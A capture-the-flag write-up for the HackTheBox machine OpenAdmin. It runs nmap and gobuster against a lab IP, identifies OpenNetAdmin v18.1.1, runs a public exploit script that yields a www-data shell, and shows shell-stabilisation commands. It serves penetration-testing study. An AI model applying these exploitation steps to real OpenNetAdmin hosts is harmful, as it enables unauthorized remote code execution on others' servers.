### OpenAdmin HackTheBox

### Difficulty = Easy

### IP Address = 10.10.10.171 

Nmap Scan:

```
└─$ nmap -sCV -A 10.10.10.171 -p22,80 -oN nmapscan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-15 01:41 WAT
Nmap scan report for 10.10.10.171
Host is up (0.35s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.16 seconds
```

Checking the web server shows the apache default page
![image](https://user-images.githubusercontent.com/113513376/218898466-9989e35e-e4a3-423c-89b2-c9e51d75f87b.png)

I'll run gobuster 

```
└─$ gobuster dir -u http://10.10.10.171 -w /usr/share/wordlists/dirb/common.txt                
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.171
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2023/02/15 02:04:07 Starting gobuster in directory enumeration mode
===============================================================
/artwork              (Status: 301) [Size: 314] [--> http://10.10.10.171/artwork/]
/index.html           (Status: 200) [Size: 10918]
/music                (Status: 301) [Size: 312] [--> http://10.10.10.171/music/]
/server-status        (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/02/15 02:05:55 Finished
===============================================================

```

We see it got two directories

Checking /artwork shows a static page
![image](https://user-images.githubusercontent.com/113513376/218898681-41b1578a-6f16-41a5-be8a-f6376f8e69b6.png)

I'll check /music
![image](https://user-images.githubusercontent.com/113513376/218898744-6ec20a93-509a-4839-8017-a70617b8dd03.png)

After looking around the music web page i got that clicking the admin button leads to /ona
![image](https://user-images.githubusercontent.com/113513376/218898879-0cba5f25-268c-4a3e-8a06-604a9288f9ec.png)

From this we know that this is an instance of OpenNetAdmin and its version is v18.1.1

Searching for exploit leads here [Exploit](https://www.exploit-db.com/exploits/47691)

Running it works

```
└─$ ./exploit.sh http://10.10.10.171/ona/
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ls
config
config_dnld.php
dcm.php
images
include
index.php
local
login.php
logout.php
modules
plugins
winc
workspace_plugins
$ 
```

Now i'll get a more stable shell
![image](https://user-images.githubusercontent.com/113513376/218899230-7c33f52b-c4a9-43e0-bd59-994e466c529f.png)

Stabilizing the shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL +Z
stty raw -echo;fg
reset
```




